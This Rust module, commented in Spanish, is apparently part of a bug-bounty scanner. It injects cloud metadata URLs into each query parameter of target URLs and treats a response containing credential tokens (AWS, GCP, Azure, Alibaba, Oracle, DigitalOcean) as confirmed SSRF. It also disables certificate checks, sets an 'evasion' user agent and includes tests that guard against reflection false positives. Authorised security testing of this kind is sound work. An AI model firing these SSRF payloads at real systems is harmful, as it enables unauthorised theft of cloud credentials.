// SPDX-License-Identifier: LicenseRef-Propietario
//! SSRF hacia metadata de nube con confirmación FUERTE (fase 3.1). nuclei+interactsh
//! detecta el CALLBACK (blind); esto detecta la EXFILTRACIÓN real —la metadata
//! vuelve EN LA RESPUESTA (in-band)— que es el bug mejor pagado ($3.5k–$50k) y una
//! confirmación mucho más fuerte. Todo por GET (lee, no escribe): «sin daño».
//!
//! El predicado `detectar_metadata_exfiltrada` es PURO y solo casa tokens
//! DISTINTIVOS de metadata (directiva 23: nada de "compute"/"instance-id" sueltos
//! que darían falsos positivos). La red solo se toca inyectando en URLs con
//! parámetros ya descubiertas.

use sqlx::SqlitePool;

/// (proveedor, tokens que SOLO aparecen en el CUERPO de una respuesta de metadata
/// REAL — nunca en la URL que inyectamos).
///
/// **Regla dura (revisión de seguridad 2026-08-23):** ningún token puede ser
/// subcadena de un `PAYLOADS`. Antes estaban `iam/security-credentials` (AWS) y
/// `computeMetadata`/`instance/service-accounts` (GCP), que son fragmentos de las
/// propias URLs inyectadas: cualquier endpoint que REFLEJE el parámetro (un
/// mensaje de error «no pude traer http://169.254.169.254/…/iam/security-credentials/»)
/// los casaba y disparaba un «SSRF crítico confirmado» FALSO. Es la lección
/// «reflexión ≠ vulnerabilidad» (FP #11 de XSS) reintroducida en la clase mejor
/// pagada. Ahora solo tokens de cuerpo, y `detectar_metadata_exfiltrada` además
/// descarta cualquier token que aparezca en lo inyectado (guardián de subcadena).
// ORDEN: los proveedores ESPECÍFICOS van primero. `detectar_metadata_exfiltrada`
// devuelve el primero que casa, y Alibaba comparte `"AccessKeyId"` con AWS: si AWS
// fuera primero, una fuga de Alibaba se etiquetaría AWS. Con Alibaba antes, su token
// distintivo `"AccessKeySecret"` (que AWS no tiene — AWS usa `SecretAccessKey`) gana,
// y una fuga de AWS real sigue casando AWS (no trae AccessKeySecret).
const HUELLAS: &[(&str, &[&str])] = &[
    // Alibaba Cloud (ECS/RAM): el STS de un rol RAM devuelve `AccessKeySecret`
    // (distinto del `SecretAccessKey` de AWS) — token de CUERPO distintivo, ausente
    // de toda URL de PAYLOADS. `"SecurityToken"` SE RETIRÓ (revisión 2026-08-27):
    // es demasiado genérico (STS/SDKs, WS-Security, Salesforce, envoltorios de
    // sesión) y con `.any()` habría bastado él solo para etiquetar un «SSRF crítico»
    // FALSO — el FP #11 (reflexión≠vuln) en la clase mejor pagada. `AccessKeySecret`
    // en PascalCase de aliyun es específico y suficiente.
    ("Alibaba", &["\"AccessKeySecret\""]),
    // Oracle Cloud (OCI): /opc/v2/instance/ devuelve OCIDs con prefijo
    // `ocid1.instance` y `ociAdName` — formas inconfundibles de OCI.
    ("Oracle", &["ocid1.instance", "\"ociAdName\""]),
    ("AWS", &["\"AccessKeyId\"", "\"SecretAccessKey\"", "ami-launch-index"]),
    ("GCP", &["\"numericProjectId\"", "\"serviceAccounts\""]),
    ("Azure", &["azEnvironment", "\"vmId\"", "\"resourceGroupName\""]),
    ("DigitalOcean", &["\"droplet_id\""]),
];

/// URLs de metadata a inyectar. Todas GET, idempotentes.
pub const PAYLOADS: &[&str] = &[
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://169.254.169.254/latest/meta-data/",
    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    "http://169.254.169.254/metadata/v1.json",
    // Alibaba Cloud: IP de metadata propia (100.100.100.200) y ruta del rol RAM.
    "http://100.100.100.200/latest/meta-data/ram/security-credentials/",
    // Oracle Cloud: IP propia (192.0.0.192) y ruta OCI v2.
    "http://192.0.0.192/opc/v2/instance/",
];

/// ¿La respuesta trae metadata de nube EXFILTRADA? PURO. Un token cuenta solo si
/// está en la RESPUESTA y **NO** en lo que inyectamos (`inyectado`): así un
/// endpoint que refleja el payload no puede fabricar un falso «confirmado». Casa
/// solo tokens de cuerpo distintivos; devuelve el proveedor.
pub fn detectar_metadata_exfiltrada(respuesta: &str, inyectado: &str) -> Option<&'static str> {
    for (proveedor, tokens) in HUELLAS {
        if tokens
            .iter()
            .any(|t| respuesta.contains(*t) && !inyectado.contains(*t))
        {
            return Some(proveedor);
        }
    }
    None
}

/// Dada una URL con parámetros, produce una variante por parámetro con su valor
/// reemplazado por `payload`. Puro. Si la URL no tiene parámetros, vacío (la SSRF
/// in-band necesita un parámetro que el backend siga).
pub fn inyectar_en_parametros(url: &str, payload: &str) -> Vec<String> {
    let parsed = match reqwest::Url::parse(url) {
        Ok(u) => u,
        Err(_) => return Vec::new(),
    };
    let pares: Vec<(String, String)> =
        parsed.query_pairs().map(|(k, v)| (k.into_owned(), v.into_owned())).collect();
    if pares.is_empty() {
        return Vec::new();
    }
    let mut out = Vec::new();
    for i in 0..pares.len() {
        let mut u = parsed.clone();
        {
            let mut qp = u.query_pairs_mut();
            qp.clear();
            for (j, (k, v)) in pares.iter().enumerate() {
                if i == j {
                    qp.append_pair(k, payload);
                } else {
                    qp.append_pair(k, v);
                }
            }
        }
        out.push(u.to_string());
    }
    out
}

/// Prueba una URL parametrizada con todos los payloads/inyecciones; devuelve el
/// proveedor y la URL usada al primer exfiltrado.
pub async fn probar(cliente: &reqwest::Client, url: &str) -> Option<(&'static str, String)> {
    for payload in PAYLOADS {
        for variante in inyectar_en_parametros(url, payload) {
            if let Ok(r) = cliente.get(&variante).send().await {
                if let Ok(cuerpo) = r.text().await {
                    // El guardián: se pasa `&variante` (lo inyectado) para que un
                    // token reflejado del payload NO cuente como exfiltración.
                    if let Some(prov) = detectar_metadata_exfiltrada(&cuerpo, &variante) {
                        return Some((prov, variante));
                    }
                }
            }
        }
    }
    None
}

/// Revisa una muestra ACOTADA de URLs parametrizadas; por cada exfiltración
/// persiste un finding (critical) y avisa. Devuelve cuántas halló.
pub async fn fase_ssrf(
    pool: &SqlitePool,
    program: &str,
    urls_param: &[String],
    max: usize,
    webhook: Option<&str>,
) -> anyhow::Result<usize> {
    let cliente = reqwest::Client::builder()
        .danger_accept_invalid_certs(true)
        .timeout(std::time::Duration::from_secs(12))
        .user_agent(crate::evasion::UA_POOL[0])
        .build()?;
    let program_id = crate::db::upsert_program(pool, program).await?;
    let mut n = 0usize;
    for url in urls_param.iter().take(max) {
        if let Some((prov, usada)) = probar(&cliente, url).await {
            let nf = crate::db::NewFinding {
                program_name: program.to_string(),
                vuln_name: format!("ssrf-metadata-{}", prov.to_ascii_lowercase()),
                severity: "critical".to_string(),
                url: usada.clone(),
                cwe: Some("CWE-918".to_string()),
                evidencia: Some(format!(
                    "SSRF a metadata {prov}: la respuesta de {usada} contiene un token distintivo del endpoint de metadata del proveedor (exfiltración confirmada por contenido)."
                )),
            };
            if crate::db::insert_finding_dedup(pool, &nf, program_id).await? {
                n += 1;
                let _ = crate::notify::notificar(
                    webhook,
                    &crate::notify::Evento::Hallazgos(vec![crate::notify::HallazgoBreve {
                        severity: "critical".into(),
                        vuln_type: format!("ssrf-metadata-{prov}"),
                        url: usada,
                        program_name: program.to_string(),
                    }]),
                )
                .await;
            }
        }
    }
    Ok(n)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn detecta_metadata_solo_con_tokens_distintivos() {
        // VERDE: credenciales AWS exfiltradas de verdad en el cuerpo → sí. El
        // segundo argumento es lo inyectado; el token del cuerpo no está ahí.
        let aws = r#"{"Code":"Success","AccessKeyId":"ASIA...","SecretAccessKey":"x"}"#;
        assert_eq!(detectar_metadata_exfiltrada(aws, PAYLOADS[0]), Some("AWS"));
        // VERDE GCP: numericProjectId es de cuerpo real, no del payload.
        let gcp = r#"{"numericProjectId":123,"projectId":"foo"}"#;
        assert_eq!(detectar_metadata_exfiltrada(gcp, PAYLOADS[2]), Some("GCP"));

        // ROJO — EL FALSO POSITIVO REAL (revisión 2026-08-23): un endpoint que
        // REFLEJA el payload en un mensaje de error NO es SSRF. El cuerpo contiene
        // «iam/security-credentials» solo porque lo inyectamos → debe dar None.
        let reflejo = "Error: could not fetch \
                       http://169.254.169.254/latest/meta-data/iam/security-credentials/";
        assert_eq!(
            detectar_metadata_exfiltrada(reflejo, PAYLOADS[0]),
            None,
            "reflexión del payload NO es exfiltración (reflexión != vulnerabilidad)"
        );
        // Y GCP igual: el cuerpo ecoa computeMetadata del payload → None.
        assert_eq!(
            detectar_metadata_exfiltrada("no route to computeMetadata/v1/instance/...", PAYLOADS[2]),
            None
        );
        // PAREJA: menciones sueltas de «compute»/«instance»/«ami» tampoco casan.
        assert!(detectar_metadata_exfiltrada("your compute instance is starting", "").is_none());
        assert!(detectar_metadata_exfiltrada(r#"{"user":{"id":1,"name":"ami"}}"#, "").is_none());

        // VERDE Alibaba: el STS de un rol RAM trae AccessKeySecret en el cuerpo.
        let ali = r#"{"AccessKeyId":"STS.x","AccessKeySecret":"y","SecurityToken":"z"}"#;
        assert_eq!(detectar_metadata_exfiltrada(ali, PAYLOADS[5]), Some("Alibaba"));
        // ROJO (revisión 2026-08-27): un cuerpo benigno con SOLO «SecurityToken»
        // —Salesforce, WS-Security, un envoltorio de sesión— NO es Alibaba. Antes,
        // con ese token en HUELLAS, habría fabricado un «SSRF crítico» falso.
        let sf = r#"{"sessionId":"00D...","SecurityToken":"abc123"}"#;
        assert_eq!(detectar_metadata_exfiltrada(sf, ""), None, "SecurityToken solo NO es exfiltración");
        // VERDE Oracle: el OCID de instancia es inconfundible.
        let oci = r#"{"ociAdName":"AD-1","id":"ocid1.instance.oc1..aaaa"}"#;
        assert_eq!(detectar_metadata_exfiltrada(oci, PAYLOADS[6]), Some("Oracle"));
        // ROJO (dir. 33): reflejar la URL de Alibaba/Oracle en un error NO es
        // exfiltración — el cuerpo no trae el token de credencial, solo el payload.
        let refl_ali = "Error: could not fetch http://100.100.100.200/latest/meta-data/ram/security-credentials/";
        assert_eq!(detectar_metadata_exfiltrada(refl_ali, PAYLOADS[5]), None);
        let refl_oci = "no route to http://192.0.0.192/opc/v2/instance/";
        assert_eq!(detectar_metadata_exfiltrada(refl_oci, PAYLOADS[6]), None);
    }

    // REGLA DURA (revisión de seguridad 2026-08-23, extendida a los nuevos
    // proveedores): ningún token de HUELLAS puede ser subcadena de un PAYLOAD, o un
    // endpoint que refleje el payload fabricaría un «confirmado» falso en la clase
    // mejor pagada. Este candado la vigila para SIEMPRE, no solo para los de hoy.
    #[test]
    fn ningun_token_es_subcadena_de_un_payload() {
        // Las DOS fuentes de `inyectado`: los PAYLOADS de la fase estática y las URLs
        // compuestas de los objetivos de arnm (base multi-nube). Un token que fuera
        // subcadena de cualquiera de ellas se auto-confirmaría por reflexión.
        let mut inyectables: Vec<String> = PAYLOADS.iter().map(|s| s.to_string()).collect();
        for o in crate::arnm::objetivos_base() {
            inyectables.push(crate::arnm::componer(&o.ip.to_string(), &o.ruta));
        }
        for (prov, tokens) in HUELLAS {
            for t in *tokens {
                for iny in &inyectables {
                    assert!(!iny.contains(t),
                        "token {t:?} de {prov} es subcadena de lo inyectado {iny:?}: reflexión daría FP");
                }
            }
        }
    }

    #[test]
    fn inyecta_por_parametro() {
        let v = inyectar_en_parametros("https://x.com/api?url=a&next=b", "http://169.254.169.254/");
        assert_eq!(v.len(), 2, "una variante por parámetro");
        assert!(v.iter().any(|u| u.contains("url=http") && u.contains("next=b")));
        assert!(v.iter().any(|u| u.contains("next=http") && u.contains("url=a")));
        // Sin parámetros → nada que inyectar in-band.
        assert!(inyectar_en_parametros("https://x.com/api", "http://169.254.169.254/").is_empty());
    }
}
